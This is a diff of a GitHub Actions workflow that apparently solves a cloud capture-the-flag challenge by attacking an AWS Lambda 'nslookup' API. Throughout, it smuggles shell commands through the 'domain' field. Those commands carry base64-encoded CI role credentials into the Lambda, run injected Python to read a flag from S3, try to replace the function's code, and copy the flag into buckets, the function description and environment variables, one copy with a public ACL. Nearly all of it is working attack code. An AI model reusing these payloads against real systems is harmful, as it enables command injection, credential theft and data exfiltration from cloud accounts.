@@ -18,141 +18,200 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Step 1 - Write creds to Lambda /tmp
+      - name: Generate presigned URL and inject into Lambda
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
           
-          # Write each credential to separate files in Lambda /tmp
-          # Using base64 to avoid shell quoting issues
-          
-          echo "=== Writing AWS_ACCESS_KEY_ID ==="
-          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
-          PAYLOAD=$(python3 -c "import json; print(json.dumps({'domain': 'x; echo $AKID_B64 | base64 -d > /tmp/a'}))")
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 3
-          
-          echo "=== Writing AWS_SECRET_ACCESS_KEY ==="
-          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
-          PAYLOAD=$(python3 -c "import json; print(json.dumps({'domain': 'x; echo $SKID_B64 | base64 -d > /tmp/s'}))")
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 3
-          
-          echo "=== Writing AWS_SESSION_TOKEN ==="
-          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          PAYLOAD=$(python3 -c "import json; print(json.dumps({'domain': 'x; echo $TOKEN_B64 | base64 -d > /tmp/t'}))")
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 3
-
-      - name: Step 2 - Write Python script to Lambda /tmp
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Create a Python script that reads creds from files, reads flag, updates Lambda
-          cat > /tmp/inject_script.py << 'PYEOF'
-          import boto3, os, sys
-
-          akid = open('/tmp/a').read().strip()
-          skid = open('/tmp/s').read().strip()
-          token = open('/tmp/t').read().strip()
-
-          session = boto3.Session(
-              aws_access_key_id=akid,
-              aws_secret_access_key=skid,
-              aws_session_token=token,
-              region_name='us-east-1'
+          # Generate a presigned URL for the flag object
+          # This is a client-side operation - no API call to AWS needed
+          # The actual permission check happens when the URL is used
+          PRESIGNED_URL=$(python3 -c "
+          import boto3
+          s3 = boto3.client('s3', region_name='us-east-1')
+          url = s3.generate_presigned_url(
+              'get_object',
+              Params={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'},
+              ExpiresIn=300
           )
-          s3 = session.client('s3')
+          print(url)
+          ")
+          echo "Presigned URL length: ${#PRESIGNED_URL}"
           
-          # Read flag from codec bucket
-          try:
-              resp = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
-              flag = resp['Body'].read().strip()
-              print(f"FLAG: {flag}")
-          except Exception as e:
-              print(f"S3 ERROR: {e}", file=sys.stderr)
+          # Also get the cicdRole creds for later use
+          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
+          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
+          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
+          
+          # Build a Python script that:
+          # 1. Fetches the presigned URL from inside the VPC
+          # 2. Stores the flag in Lambda Description using cicdRole creds
+          cat > /tmp/lambda_script.py << 'PYEOF'
+          import urllib.request
+          import boto3
+          import os
+          import sys
+          import traceback
+
+          # Step 1: Fetch the flag via presigned URL
+          url = os.environ.get('PRESIGNED_URL', '')
+          if not url:
+              print("ERROR: No presigned URL", file=sys.stderr)
               sys.exit(1)
-          
-          # Store in Lambda description
+
           try:
+              req = urllib.request.urlopen(url, timeout=10)
+              flag = req.read().strip()
+              print(f"FLAG: {flag}")
+              print(f"FLAG decoded: {flag.decode() if isinstance(flag, bytes) else flag}")
+          except Exception as e:
+              print(f"FETCH ERROR: {e}", file=sys.stderr)
+              traceback.print_exc(file=sys.stderr)
+              
+              # Fallback: try with boto3 using cicdRole creds from env
+              try:
+                  akid = os.environ.get('CICD_AKID', '')
+                  skid = os.environ.get('CICD_SKID', '')
+                  token = os.environ.get('CICD_TOKEN', '')
+                  session = boto3.Session(
+                      aws_access_key_id=akid,
+                      aws_secret_access_key=skid,
+                      aws_session_token=token,
+                      region_name='us-east-1'
+                  )
+                  s3 = session.client('s3')
+                  resp = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
+                  flag = resp['Body'].read().strip()
+                  print(f"FLAG (boto3 fallback): {flag}")
+              except Exception as e2:
+                  print(f"BOTO3 ERROR: {e2}", file=sys.stderr)
+                  traceback.print_exc(file=sys.stderr)
+                  sys.exit(1)
+
+          flag_str = flag.decode() if isinstance(flag, bytes) else flag
+
+          # Step 2: Store flag in Lambda Description
+          # Try with cicdRole creds first (has lambda:* from VPC)
+          try:
+              akid = os.environ.get('CICD_AKID', '')
+              skid = os.environ.get('CICD_SKID', '')
+              token = os.environ.get('CICD_TOKEN', '')
+              session = boto3.Session(
+                  aws_access_key_id=akid,
+                  aws_secret_access_key=skid,
+                  aws_session_token=token,
+                  region_name='us-east-1'
+              )
               lam = session.client('lambda')
               lam.update_function_configuration(
                   FunctionName='nslookupv2',
-                  Description=flag.decode() if isinstance(flag, bytes) else flag
+                  Description=flag_str
               )
-              print("Stored in Description")
+              print("SUCCESS: Flag stored in Description via cicdRole")
           except Exception as e:
-              print(f"LAMBDA ERROR: {e}", file=sys.stderr)
-          
-          # Also write to platform bucket
+              print(f"Desc update (cicdRole) ERROR: {e}", file=sys.stderr)
+              # Try with Lambda's own role
+              try:
+                  lam = boto3.client('lambda', region_name='us-east-1')
+                  lam.update_function_configuration(
+                      FunctionName='nslookupv2',
+                      Description=flag_str
+                  )
+                  print("SUCCESS: Flag stored in Description via own role")
+              except Exception as e2:
+                  print(f"Desc update (own role) ERROR: {e2}", file=sys.stderr)
+
+          # Step 3: Also try writing to various buckets
+          for bucket in ['codec4f26c862a321ef5', 'site781fe43f26b9eba3', 'platform-bucket-009661764077-us-east-1']:
+              try:
+                  akid = os.environ.get('CICD_AKID', '')
+                  skid = os.environ.get('CICD_SKID', '')
+                  token = os.environ.get('CICD_TOKEN', '')
+                  session = boto3.Session(
+                      aws_access_key_id=akid,
+                      aws_secret_access_key=skid,
+                      aws_session_token=token,
+                      region_name='us-east-1'
+                  )
+                  s3 = session.client('s3')
+                  s3.put_object(Bucket=bucket, Key='flag-exfil.txt', Body=flag)
+                  print(f"Wrote flag to {bucket}")
+              except Exception as e:
+                  print(f"Write to {bucket} ERROR: {e}", file=sys.stderr)
+
+          # Step 4: Also store in Lambda env var
           try:
-              s3.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
-              print("Wrote to platform bucket")
+              akid = os.environ.get('CICD_AKID', '')
+              skid = os.environ.get('CICD_SKID', '')
+              token = os.environ.get('CICD_TOKEN', '')
+              session = boto3.Session(
+                  aws_access_key_id=akid,
+                  aws_secret_access_key=skid,
+                  aws_session_token=token,
+                  region_name='us-east-1'
+              )
+              lam = session.client('lambda')
+              # Get current env vars
+              current = lam.get_function_configuration(FunctionName='nslookupv2')
+              env_vars = current.get('Environment', {}).get('Variables', {})
+              env_vars['FLAG'] = flag_str
+              lam.update_function_configuration(
+                  FunctionName='nslookupv2',
+                  Environment={'Variables': env_vars}
+              )
+              print("SUCCESS: Flag stored in env var via cicdRole")
           except Exception as e:
-              print(f"PLATFORM ERROR: {e}", file=sys.stderr)
-          
-          # Also write to site bucket  
-          try:
-              s3.put_object(Bucket='site781fe43f26b9eba3', Key='flag.txt', Body=flag)
-              print("Wrote to site bucket")
-          except Exception as e:
-              print(f"SITE ERROR: {e}", file=sys.stderr)
-          
-          # Also copy to codec bucket with public ACL
-          try:
-              s3.put_object(Bucket='codec4f26c862a321ef5', Key='exfil.txt', Body=flag, ACL='public-read')
-              print("Wrote to codec with public ACL")
-          except Exception as e:
-              print(f"CODEC ERROR: {e}", file=sys.stderr)
+              print(f"Env update ERROR: {e}", file=sys.stderr)
+              # Try with own role
+              try:
+                  lam = boto3.client('lambda', region_name='us-east-1')
+                  current = lam.get_function_configuration(FunctionName='nslookupv2')
+                  env_vars = current.get('Environment', {}).get('Variables', {})
+                  env_vars['FLAG'] = flag_str
+                  lam.update_function_configuration(
+                      FunctionName='nslookupv2',
+                      Environment={'Variables': env_vars}
+                  )
+                  print("SUCCESS: Flag stored in env var via own role")
+              except Exception as e2:
+                  print(f"Env update (own role) ERROR: {e2}", file=sys.stderr)
+
+          print("ALL DONE")
           PYEOF
-          
-          SCRIPT_B64=$(base64 -w0 /tmp/inject_script.py)
-          echo "Script length (b64): ${#SCRIPT_B64}"
-          
-          PAYLOAD=$(python3 -c "import json; print(json.dumps({'domain': 'x; echo $SCRIPT_B64 | base64 -d > /tmp/r.py'}))")
-          echo "=== Writing script to Lambda /tmp ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 3
 
-      - name: Step 3 - Run the script in Lambda
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          # Base64-encode the script
+          SCRIPT_B64=$(base64 -w0 /tmp/lambda_script.py)
           
-          echo "=== Running script in Lambda ==="
-          PAYLOAD='{"domain": "x; python3 /tmp/r.py 2>&1"}'
+          # Build the injection command - all in ONE invocation
+          # Decode creds, set env vars, write script, run it
+          # Using the presigned URL via env var
+          
+          # The injection: 
+          # 1. Write script to /tmp/r.py
+          # 2. Set env vars with decoded creds
+          # 3. Set PRESIGNED_URL env var
+          # 4. Run the script
+          
+          # URL-encode the presigned URL to avoid shell issues
+          # Actually, let's base64-encode it too
+          URL_B64=$(printf '%s' "$PRESIGNED_URL" | base64 -w0)
+          
+          INJECT="echo $SCRIPT_B64 | base64 -d > /tmp/r.py; export CICD_AKID=\$(echo $AKID_B64 | base64 -d); export CICD_SKID=\$(echo $SKID_B64 | base64 -d); export CICD_TOKEN=\$(echo $TOKEN_B64 | base64 -d); export PRESIGNED_URL=\$(echo $URL_B64 | base64 -d); python3 /tmp/r.py 2>&1"
+          
+          # Build JSON payload using python3
+          PAYLOAD=$(python3 -c "
+          import json, sys
+          domain = 'x; ' + sys.argv[1]
+          print(json.dumps({'domain': domain}))
+          " "$INJECT")
+          
+          echo "=== Payload length: ${#PAYLOAD} ==="
+          echo "=== Sending injection (presigned URL approach) ==="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
           echo
-          echo "=== Waiting for Lambda ==="
-          sleep 15
+          echo "=== Waiting for Lambda to process ==="
+          sleep 20
 
-      - name: Step 4 - Also try with aws CLI directly
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Try using aws CLI from the Lambda layer with cicdRole creds
-          echo "=== Try aws CLI approach ==="
-          PAYLOAD='{"domain": "x; export AWS_ACCESS_KEY_ID=$(cat /tmp/a); export AWS_SECRET_ACCESS_KEY=$(cat /tmp/s); export AWS_SESSION_TOKEN=$(cat /tmp/t); export AWS_DEFAULT_REGION=us-east-1; /opt/aws/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt 2>&1; F=$(cat /tmp/f.txt); /opt/aws/bin/aws lambda update-function-configuration --function-name nslookupv2 --description $F 2>&1"}'
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          echo
-          echo "=== Waiting ==="
-          sleep 15
-
-      - name: Step 5 - Also try Lambda own role with aws CLI
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Find the aws binary path
-          echo "=== Find aws binary ==="
-          PAYLOAD='{"domain": "x; which aws 2>&1; ls /opt/aws/bin/ 2>&1; ls /opt/bin/ 2>&1"}'
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 3
-          
-          echo "=== Try Lambda own role: read flag ==="
-          PAYLOAD='{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f2.txt 2>&1; F2=$(cat /tmp/f2.txt); aws lambda update-function-configuration --function-name nslookupv2 --description $F2 2>&1"}'
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          echo
-          sleep 12
-
-      - name: Step 6 - Read results
+      - name: Read results
         if: always()
         run: |
           echo "===== Lambda Description ====="
@@ -172,100 +231,123 @@ jobs:
           
           echo "===== Direct HTTP reads ====="
           for bucket in codec4f26c862a321ef5 site781fe43f26b9eba3 platform-bucket-009661764077-us-east-1; do
-            for obj in flag.txt exfil.txt; do
+            for obj in flag.txt flag-exfil.txt; do
               echo "--- $bucket/$obj ---"
               curl -s "https://$bucket.s3.us-east-1.amazonaws.com/$obj" 2>&1 | head -3
               echo
             done
           done
 
-      - name: Step 7 - Try updating Lambda code to return flag
+      - name: Also try direct presigned URL from here
         if: always()
         run: |
-          # Create a new Lambda function that reads the flag and returns it
-          cat > /tmp/new_lambda.py << 'PYEOF'
+          # Try to generate and use a presigned URL directly (should fail outside VPC)
+          echo "=== Try direct presigned URL from GitHub Actions (should fail) ==="
+          python3 -c "
           import boto3
-          import json
-          import os
+          s3 = boto3.client('s3', region_name='us-east-1')
+          url = s3.generate_presigned_url(
+              'get_object',
+              Params={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'},
+              ExpiresIn=60
+          )
+          print(f'URL: {url[:100]}...')
+          import urllib.request
+          try:
+              resp = urllib.request.urlopen(url, timeout=10)
+              print(f'RESULT: {resp.read()}')
+          except Exception as e:
+              print(f'ERROR (expected): {e}')
+          "
 
-          def lambda_handler(event, context):
-              # Try reading flag with Lambda's own role
+      - name: Second attempt - simpler injection
+        if: always()
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Generate a new presigned URL (previous one might have expired)
+          PRESIGNED_URL=$(python3 -c "
+          import boto3
+          s3 = boto3.client('s3', region_name='us-east-1')
+          url = s3.generate_presigned_url(
+              'get_object',
+              Params={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'},
+              ExpiresIn=300
+          )
+          print(url)
+          ")
+          
+          # Simpler approach: just curl the presigned URL and write to Lambda description using Lambda's own role
+          # First, write the presigned URL to a file in Lambda /tmp
+          URL_B64=$(printf '%s' "$PRESIGNED_URL" | base64 -w0)
+          
+          # Single injection: fetch URL, write to file, then update description
+          # Use python3 -c with urllib for the fetch (always available in Lambda)
+          # Then use boto3 with Lambda's own role for the description update
+          
+          PAYLOAD=$(python3 -c "
+          import json
+          cmd = 'x; python3 -c \"import urllib.request; f=urllib.request.urlopen(\\\"' + '$URL_B64' + '\\\",timeout=10).read().strip(); import boto3; lam=boto3.client(\\\"lambda\\\"); lam.update_function_configuration(FunctionName=\\\"nslookupv2\\\",Description=f.decode())\" 2>&1'
+          # Actually this is getting too complex with quoting. Let's use a different approach.
+          # Write the URL to a file, then in a second call, fetch and store
+          print(json.dumps({'domain': 'x; echo $URL_B64 | base64 -d > /tmp/u'}))
+          ")
+          echo "=== Writing presigned URL to Lambda /tmp ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
+          sleep 3
+          
+          # Now fetch the URL and store result in Lambda description
+          # Use a heredoc-free approach with python3
+          echo "=== Fetching flag via presigned URL ==="
+          PAYLOAD2=$(python3 -c "
+          import json
+          cmd = 'x; F=\$(python3 -c \"import urllib.request; f=urllib.request.urlopen(open(\\'/tmp/u\\').read().strip(),timeout=10).read().strip(); print(f.decode())\" 2>&1); python3 -c \"import boto3; lam=boto3.client(\\\"lambda\\\"); lam.update_function_configuration(FunctionName=\\\"nslookupv2\\\",Description=\\\"' + '\$F' + '\\\")\" 2>&1'
+          print(json.dumps({'domain': cmd}))
+          ")
+          
+          # Actually this quoting is impossible. Let me use a different approach.
+          # Write a script to /tmp, then execute it
+          
+          cat > /tmp/simple_fetch.py << 'PYEOF'
+          import urllib.request
+          import boto3
+          import sys
+          import traceback
+
+          url = open('/tmp/u').read().strip()
+          try:
+              resp = urllib.request.urlopen(url, timeout=10)
+              flag = resp.read().strip()
+              print(f"FLAG: {flag}")
+              flag_str = flag.decode() if isinstance(flag, bytes) else flag
+              # Update Lambda description with own role
               try:
-                  s3 = boto3.client('s3', region_name='us-east-1')
-                  flag = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().strip()
-                  return {
-                      'statusCode': 200,
-                      'body': json.dumps({'flag': flag.decode(), 'method': 'own_role'})
-                  }
+                  lam = boto3.client('lambda', region_name='us-east-1')
+                  lam.update_function_configuration(FunctionName='nslookupv2', Description=flag_str)
+                  print("Updated Description via own role")
               except Exception as e:
-                  # Try with cicdRole creds from /tmp
-                  try:
-                      akid = open('/tmp/a').read().strip()
-                      skid = open('/tmp/s').read().strip()
-                      token = open('/tmp/t').read().strip()
-                      session = boto3.Session(
-                          aws_access_key_id=akid,
-                          aws_secret_access_key=skid,
-                          aws_session_token=token,
-                          region_name='us-east-1'
-                      )
-                      s3 = session.client('s3')
-                      flag = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')['Body'].read().strip()
-                      return {
-                          'statusCode': 200,
-                          'body': json.dumps({'flag': flag.decode(), 'method': 'cicd_role'})
-                      }
-                  except Exception as e2:
-                      return {
-                          'statusCode': 500,
-                          'body': json.dumps({'error': str(e), 'error2': str(e2)})
-                      }
+                  print(f"Own role update failed: {e}")
+                  traceback.print_exc()
+          except Exception as e:
+              print(f"FETCH ERROR: {e}")
+              traceback.print_exc()
+              sys.exit(1)
           PYEOF
           
-          # Zip the new Lambda code
-          cd /tmp && zip -r new_lambda.zip new_lambda.py
+          SCRIPT_B64=$(base64 -w0 /tmp/simple_fetch.py)
           
-          # Try to update Lambda function code directly from GitHub Actions (might fail - needs VPC)
-          echo "=== Try direct code update (from GitHub Actions) ==="
-          aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/new_lambda.zip --region us-east-1 2>&1 || echo "Direct update failed (expected if VPC condition)"
+          echo "=== Writing fetch script to Lambda /tmp ==="
+          PAYLOAD3=$(python3 -c "import json; print(json.dumps({'domain': 'x; echo $SCRIPT_B64 | base64 -d > /tmp/sf.py'}))")
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD3" 2>&1
+          sleep 3
           
-          # If that failed, inject a command to update Lambda code from within the Lambda
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          
-          # Read the new code as base64
-          CODE_B64=$(base64 -w0 /tmp/new_lambda.zip)
-          echo "Code zip b64 length: ${#CODE_B64}"
-          
-          # Write the new code zip to /tmp in Lambda, then update with aws CLI using cicdRole creds
-          echo "=== Inject: write code zip to Lambda /tmp ==="
-          PAYLOAD=$(python3 -c "import json; print(json.dumps({'domain': 'x; echo $CODE_B64 | base64 -d > /tmp/new.zip'}))")
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
-          sleep 5
-          
-          echo "=== Inject: update Lambda code using cicdRole creds ==="
-          PAYLOAD='{"domain": "x; export AWS_ACCESS_KEY_ID=$(cat /tmp/a); export AWS_SECRET_ACCESS_KEY=$(cat /tmp/s); export AWS_SESSION_TOKEN=$(cat /tmp/t); export AWS_DEFAULT_REGION=us-east-1; /opt/aws/bin/aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/new.zip 2>&1"}'
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
+          echo "=== Running fetch script ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "x; python3 /tmp/sf.py 2>&1"}' 2>&1
           echo
-          sleep 15
-
-      - name: Step 8 - Call Lambda to get flag in response
-        if: always()
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          sleep 10
           
-          echo "=== Calling Lambda (normal request) ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
-          echo
-          echo "=== Calling Lambda (another request) ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "flag"}' 2>&1
-          echo
+          echo "=== Read Lambda Description ==="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
           
-          echo "=== Check Lambda config ==="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1 | head -20
-          
-          echo "=== Check all buckets ==="
-          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1 || true
-          echo "---"
-          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1 || true
-          echo "---"
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true
+          echo "=== Read Lambda Env ==="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment.Variables' 2>&1 || true
